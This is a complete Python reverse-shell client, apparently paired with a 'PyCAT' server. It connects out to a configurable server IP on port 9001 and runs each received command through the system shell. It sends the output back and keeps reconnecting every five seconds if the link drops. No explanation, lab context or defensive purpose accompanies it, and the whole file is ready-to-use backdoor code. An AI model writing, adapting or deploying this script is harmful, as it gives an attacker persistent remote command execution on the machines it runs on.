import socket
import subprocess
import time
import sys

SERVER_IP = "YOUR_SERVER_IP"  # <-- Replace with your PyCAT server IP here
SERVER_PORT = 9001            # <-- Match PyCAT server port

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            while True:
                data = s.recv(1024).decode()
                if not data:
                    break
                if data.strip().lower() == "exit":
                    s.close()
                    sys.exit(0)
                # Execute received command in shell
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                if not stdout_value:
                    stdout_value = b"Command executed, no output."
                s.send(stdout_value)
        except Exception:
            # Connection failed or lost, retry after delay
            time.sleep(5)

if __name__ == "__main__":
    main()
